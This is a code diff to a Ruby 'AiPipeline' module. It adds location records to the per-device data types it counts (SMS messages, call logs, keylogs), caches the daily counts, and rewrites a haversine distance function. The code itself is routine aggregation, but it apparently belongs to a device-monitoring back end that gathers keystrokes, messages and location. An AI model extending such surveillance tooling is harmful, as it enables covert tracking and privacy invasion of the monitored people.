@@ -171,24 +171,36 @@ module AiPipeline
                  when 'sms'     then device.sms_messages
                  when 'call'    then device.call_logs
                  when 'keylog'  then device.keylogs
+                 when 'location' then device.geo_locations
                  else return []
                  end
 
-      relation
-        .where('created_at > ?', 30.days.ago)
-        .group("DATE(created_at)")
-        .count
-        .values
+      # Cache the result for 1 hour to avoid repeated heavy queries
+      Rails.cache.fetch("ai_pipeline:counts:#{device.id}:#{data_type}", expires_in: 1.hour) do
+        relation
+          .where('created_at > ?', 30.days.ago)
+          .group("DATE(created_at)")
+          .order("DATE(created_at) ASC")
+          .count
+          .values
+      end
     end
 
     def haversine(lat1, lng1, lat2, lng2)
+      return 0.0 if lat1 == lat2 && lng1 == lng2
+      
+      # Use Math methods more efficiently
+      dtor = Math::PI / 180
       r = 6371.0
-      dlat = (lat2 - lat1) * Math::PI / 180
-      dlng = (lng2 - lng1) * Math::PI / 180
+      
+      dlat = (lat2 - lat1) * dtor
+      dlng = (lng2 - lng1) * dtor
+      
       a = Math.sin(dlat / 2)**2 +
-          Math.cos(lat1 * Math::PI / 180) * Math.cos(lat2 * Math::PI / 180) *
+          Math.cos(lat1 * dtor) * Math.cos(lat2 * dtor) *
           Math.sin(dlng / 2)**2
-      2 * r * Math.asin(Math.sqrt(a))
+      
+      2 * r * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))
     end
 
     def self.hourly_distribution(relation)
